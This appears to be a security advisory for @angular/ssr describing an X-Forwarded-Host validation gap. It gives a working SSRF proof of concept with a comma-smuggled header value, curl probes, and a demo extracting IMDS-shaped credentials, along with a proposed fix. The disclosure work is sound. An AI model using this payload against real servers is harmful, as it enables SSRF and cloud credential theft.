# @angular/ssr - Patched Headers.get returns unvalidated raw X-Forwarded-Host

**Product:** @angular/ssr
**Repository:** https://github.com/angular/angular-cli
**Component:** `packages/angular/ssr/src/utils/validation.ts:95-180` (`cloneRequestAndPatchHeaders`) + `:48-58` (`getFirstHeaderValue`) + `:216-234` (`verifyHostAllowed`)
**Version:** 21.2.8 (latest stable on npm). Tested against the shipped bundle `node_modules/@angular/ssr/fesm2022/_validation-chunk.mjs` and source at commit `012239817487fbd3a404ced3bbf7b8dcbda2ff02` on `main`.
**Type:** CWE-20 (Improper Input Validation) with downstream CWE-918 (SSRF) impact depending on consumer
**CVSS 3.1:** 7.5 High (`AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N`) when the downstream sink reaches cloud metadata (IMDS) or an equivalent higher-authority endpoint. See Severity section below for lower-impact deployments.

## Description

`cloneRequestAndPatchHeaders()` replaces the `Headers` object on the cloned request so that every read of `host` or `x-forwarded-host` goes through `validateHeader()`, which calls `verifyHostAllowed()`. Both internal checks use `getFirstHeaderValue()` to split the header on the first comma and only validate the first token. The patched `Headers.get()` (and its `.values()`, `.entries()`, `.forEach()`, and iterator counterparts) then return the original raw header string to the caller.

The effect is a contract violation. The presence of the patched `get()` signals to application developers that the returned value has been validated. In practice the framework only guarantees that the first comma-separated token is on the allowlist; the remainder of the string is returned unchanged and was never checked.

An attacker who sends `X-Forwarded-Host: localhost,@127.0.0.1:8765` against an app configured with `allowedHosts: ["localhost"]` passes the primary inbound check (first token is `localhost`) and the secondary per-read check (first token is still `localhost`). The patched `get()` returns `"localhost,@127.0.0.1:8765"`. WHATWG URL parsing of `http://localhost,@127.0.0.1:8765/path` produces:

```
u.hostname = "127.0.0.1"
u.port     = "8765"
u.host     = "127.0.0.1:8765"
u.username = "localhost,"
```

Application code that parses the returned value into a URL and issues a network request using `u.hostname`/`u.port`/`u.host` ends up talking to the attacker's endpoint on behalf of the SSR process.

```ts
// packages/angular/ssr/src/utils/validation.ts:48 - splits on first comma
export function getFirstHeaderValue(value) {
  if (Array.isArray(value)) return value[0]?.trim();
  return value?.toString().split(',', 1)[0]?.trim();
}

// packages/angular/ssr/src/utils/validation.ts:114 - patched get
const originalGet = headers.get;
(headers.get as typeof originalGet) = function (name) {
  const value = originalGet.call(headers, name);
  if (!value) return value;
  validateHeader(name, value, allowedHosts, onError);   // validates first token
  return value;                                          // returns raw
};

// packages/angular/ssr/src/utils/validation.ts:216 - validates first token only
function verifyHostAllowed(headerName, headerValue, allowedHosts) {
  const value = getFirstHeaderValue(headerValue);
  if (!value) return;
  const url = `http://${value}`;
  if (!URL.canParse(url)) throw new Error(...);
  const { hostname } = new URL(url);
  if (!isHostAllowed(hostname, allowedHosts)) throw new Error(...);
}
```

### Scope - who is and is not affected

- Framework-internal URL construction is safe. `packages/angular/ssr/node/src/request.ts:88-99` uses `getFirstHeaderValue()` itself when it builds `request.url`, so `request.url` always reflects the first token and the framework's own HttpClient relative resolution is unaffected.
- The bug surface is SSR application code that reads `request.headers.get('x-forwarded-host')` or iterates via `.values()`, `.entries()`, `.forEach()`, or `[Symbol.iterator]` and uses the returned value to build a URL, a link, a cookie domain, or any other security-relevant string.

### Distinct from prior CVEs

- CVE-2025-62427 (PR #31474): fixed protocol-relative `originalUrl` hijacking `request.url`. Does not touch the header-getter contract.
- CVE-2026-27739 (PR #32516): introduced `allowedHosts`, `validateHeaders`, and `cloneRequestAndPatchHeaders`. The first-token-only policy inside these new checks is the gap this report addresses.

## Severity

The score depends on what the downstream app sink is. One sink, cloud metadata (IMDS), is realistic for any SSR app deployed on AWS/GCP/Azure and produces direct IAM credential disclosure. The submission uses that as the realistic scoring scenario.

Scoring table (CVSS 3.1 base, computed with the official formula):

| Scenario | Vector | Score | Rationale |
|---|---|---|---|
| Lower bound (info disclosure only) | `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N` | 4.8 | Only partial data leaked, same security authority |
| IMDS exfil, conservative | `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N` | 6.8 | IMDS is a different security authority; IAM creds = direct serious impact per CVSS §2.3.1 |
| **IMDS exfil, realistic (recommended)** | **`AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N`** | **7.5** | Adds limited integrity impact from secondary sinks (canonical link injection, OAuth `redirect_uri` steering) |
| Full session hijack | `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N` | 8.7 | Set-Cookie Domain or CORS Origin echo = total integrity loss |

CVSS 3.1 §2.3.1 states C:H applies when "access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password." AWS IAM credentials are the canonical example.

CVSS 3.1 User Guide §11 establishes the Scope Change rule: "A vulnerability in an application that implements its own security authority which allows attackers to affect resources outside its security scope is scored as a Scope change." IMDS (169.254.x) belongs to the cloud provider's IAM authority, not the SSR app's authority.

### End-to-end IMDS demonstration

A second victim on `127.0.0.1:16900` returning IMDS-shaped JSON was exercised using the same exploit header. The rendered SSR HTML contained:

```
FETCH=http://127.0.0.1:16900/probe|BODY={
  "Code":"Success",
  "LastUpdated":"2026-04-24T09:52:25.456Z",
  "Type":"AWS-HMAC",
  "AccessKeyId":"ASIAQ3EXAMPLEIMDS",
  "SecretAccessKey":"wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY",
  "Token":"IQoJb3JpZ2luX2VjEFsaCXVzLXdlc3QtMiJHMEUCIQDexampleIMDSTOKEN",
  "Expiration":"2026-04-25T00:00:00Z"
}
```

The attacker extracts IAM role credentials (`AccessKeyId`, `SecretAccessKey`, `Token`) from the response HTML and uses them to assume the cloud account's role. Evidence is in `evidence/imds-run.txt`.

## Impact

Downstream impact depends on what the consuming application does with the raw header value. The framework's apparent validation contract encourages app code to trust the returned string, which is the crux of the issue.

Realistic consumer patterns that complete an exploit:

- `http.request({host: u.hostname, port: u.port, path})` using `node:http` or equivalent. Bypasses undici's rejection of URLs containing credentials. Demonstrated end to end in this submission's PoC.
- Canonical URL injection: `` `<link rel="canonical" href="https://${raw}${path}"/>` `` rendered into the response. Preview unfurlers (Slack, Twitter, LinkedIn) and SEO crawlers may follow the injected host.
- OAuth `redirect_uri` or password-reset / email-verification links built from the raw host. Open redirect / token exfil.
- `Set-Cookie Domain=` or `Access-Control-Allow-Origin` echoed from the raw value. Origin confusion, credential theft.
- Structured logging that carries the raw host into a downstream aggregator (Sentry, Datadog) which may enrich or fetch URLs - blind SSRF through the logging pipeline.
- `APP_BASE_HREF` or `DOCUMENT.location` SSR providers constructed from the raw value.

The PoC in this submission demonstrates the `http.request` sink end-to-end: the SSR process makes an outbound TCP connection to an attacker-chosen address, and the attacker's response body is rendered into the HTML returned to the original HTTP request.

## Steps to Reproduce

Tested with Node.js 20+. Under 5 minutes.

### 1. Scaffold

```bash
cd /tmp
npx -y -p @angular/cli@21.2.8 ng new xfh-comma-leak \
  --ssr --routing=true --style=css --skip-git --skip-install
cd xfh-comma-leak
npm install
```

### 2. Configure restrictive allowlist (`angular.json`)

```json
"security": { "allowedHosts": ["localhost"] }
```

### 3. Per-request SSR (`src/app/app.routes.server.ts`)

```ts
import { RenderMode, ServerRoute } from '@angular/ssr';
export const serverRoutes: ServerRoute[] = [
  { path: '**', renderMode: RenderMode.Server },
];
```

### 4. Component that reads `X-Forwarded-Host` and uses `node:http` outbound (`src/app/app.ts`)

```ts
import { Component, REQUEST, inject, signal } from '@angular/core';
import { toSignal } from '@angular/core/rxjs-interop';
import { catchError, from, of } from 'rxjs';

async function probe(target: URL): Promise<string> {
  const { request } = await import('node:http');
  return new Promise((resolve, reject) => {
    const req = request(
      { host: target.hostname, port: target.port ? Number(target.port) : 80, path: target.pathname, method: 'GET' },
      (res) => {
        let body = '';
        res.on('data', (c) => (body += c));
        res.on('end', () => resolve(`STATUS=${res.statusCode}|BODY=${body}`));
      },
    );
    req.on('error', reject);
    req.end();
  });
}

@Component({
  selector: 'app-root',
  imports: [],
  template: `<pre id="result">{{ result() }}</pre>`,
})
export class App {
  private readonly request = inject(REQUEST, { optional: true });
  protected readonly result = (() => {
    if (!this.request) return signal('no-request');
    const raw = this.request.headers.get('x-forwarded-host');
    if (!raw) return signal('no-xfh');
    let target: URL;
    try { target = new URL(`http://${raw}/probe`); }
    catch (e) { return signal('URL_ERR=' + (e as Error).message); }
    return toSignal(
      from(probe(target)).pipe(catchError((e) => of(`ERR=${String(e).slice(0, 120)}`))),
      { initialValue: `target=${target.protocol}//${target.host}${target.pathname}|pending` },
    );
  })();
}
```

### 5. Replace `src/server.ts`

```ts
import { AngularNodeAppEngine, createNodeRequestHandler, writeResponseToNodeResponse } from '@angular/ssr/node';
import express from 'express';
import { join } from 'node:path';

const browserDistFolder = join(import.meta.dirname, '../browser');
const app = express();
const angularApp = new AngularNodeAppEngine();
app.use(express.static(browserDistFolder, { maxAge: '1y', index: false, redirect: false }));
app.use((req, res, next) => {
  angularApp.handle(req).then((response) =>
    response ? writeResponseToNodeResponse(response, res) : next()
  ).catch(next);
});
const port = process.env['PORT'] || 5100;
app.listen(port, () => console.log(`server listening on http://localhost:${port}`));
export const reqHandler = createNodeRequestHandler(app);
```

### 6. Build and run

```bash
npx ng build
node dist/xfh-comma-leak/server/server.mjs &

cat > /tmp/victim.mjs <<'EOF'
import http from 'node:http';
const stamp = Date.now();
http.createServer((req, res) => {
  console.log(`[victim:8765] ${req.method} ${req.url}`);
  res.end(`COMMA_LEAK_SECRET_${stamp}`);
}).listen(8765, '127.0.0.1', () => console.log(`victim 8765 stamp=${stamp}`));
EOF
node /tmp/victim.mjs &
```

### 7. Probes

```bash
# A. Baseline
curl -s http://127.0.0.1:5100/ -H 'Host: localhost:5100' | grep -oE '<pre id="result">[^<]*'
# Expected: <pre id="result">no-xfh

# B. Exploit
curl -s http://127.0.0.1:5100/ -H 'Host: localhost:5100' \
                               -H 'X-Forwarded-Host: localhost,@127.0.0.1:8765' \
  | grep -oE '<pre id="result">[^<]*'
# Expected: <pre id="result">STATUS=200|BODY=COMMA_LEAK_SECRET_<timestamp>

# C. Control
curl -s http://127.0.0.1:5100/ -H 'Host: localhost:5100' \
                               -H 'X-Forwarded-Host: evil.test'
# Expected: URL with hostname "evil.test" is not allowed.
```

The victim log gains one `[victim:8765] GET /probe` line after probe B. The timestamp in the rendered HTML matches the victim's `stamp=` from startup, closing the chain.

## Evidence

Reference run in `evidence/`.

Probe A (baseline): `<pre id="result">no-xfh</pre>`. Victim log unchanged.

Probe B (exploit): `<pre id="result">STATUS=200|BODY=COMMA_LEAK_SECRET_1777021612679</pre>`. Victim log gained `[victim:8765] GET /probe`.

Probe C (control): `URL with hostname "evil.test" is not allowed.`

A and C together confirm the single-token form is still rejected. B confirms the comma-smuggled form passes validation and delivers attacker-controlled content to the response. `localhost,,@127.0.0.1:8765` and `localhost,safe.internal,@127.0.0.1:8765` produce the same result.

## Scope of leak at the header layer

All six patched header-read paths in `cloneRequestAndPatchHeaders` (`:114-180`) return the original raw value:

| Method | Validates first token | Returns raw value |
|---|---|---|
| `headers.get()` | yes | yes |
| `headers.values()` | yes | yes |
| `headers.entries()` | yes | yes |
| `headers.forEach()` | yes | yes |
| `headers[Symbol.iterator]` | yes | yes |
| `[...headers]` (spread) | via iterator | yes |

The primary `request.url` is not hijacked because `createRequestUrl()` at `packages/angular/ssr/node/src/request.ts:80-106` uses `getFirstHeaderValue()`. The attack vector is limited to app code that consumes the raw header via the patched reads above.

## Notes on WHATWG URL parsing

A common counter-argument is that a naive `` `https://${raw}/api/x` `` string template would break the URL parse. It does not. `new URL("https://localhost,@127.0.0.1:8765/api/x")` parses to `hostname=127.0.0.1`, `port=8765`, `username=localhost,`. What fails is only `fetch(urlWithCredentials)` in Node, because undici refuses URLs with userinfo. Any transport that takes `host`+`port`+`path` components (such as `node:http.request`) or builds a new URL string from `u.host` accepts the hijacked host and issues the outbound request.

## Suggested Fix

One line. Apply the same pattern the project already uses for `x-forwarded-prefix` at lines 108-112. In the patched `Headers.get()` at line 114, return the validated first token instead of the raw value:

```ts
const originalGet = headers.get;
(headers.get as typeof originalGet) = function (name) {
  const value = originalGet.call(headers, name);
  if (!value) return value;
  validateHeader(name, value, allowedHosts, onError);
  if (HOST_HEADERS_TO_VALIDATE.has(name.toLowerCase())) {
    return getFirstHeaderValue(value) ?? value;
  }
  return value;
};
```

Apply the same normalization in `.values()`, `.entries()`, `.forEach()`, and the iterator so every read path returns the validated token rather than the raw string.

Alternative: canonicalize `host` and `x-forwarded-host` at the top of `cloneRequestAndPatchHeaders()` via `headers.set(...)`, mirroring the existing treatment of `x-forwarded-prefix`.

Either fix closes the class of bug without affecting the framework's own internal consumers, which already normalize via `getFirstHeaderValue()`.
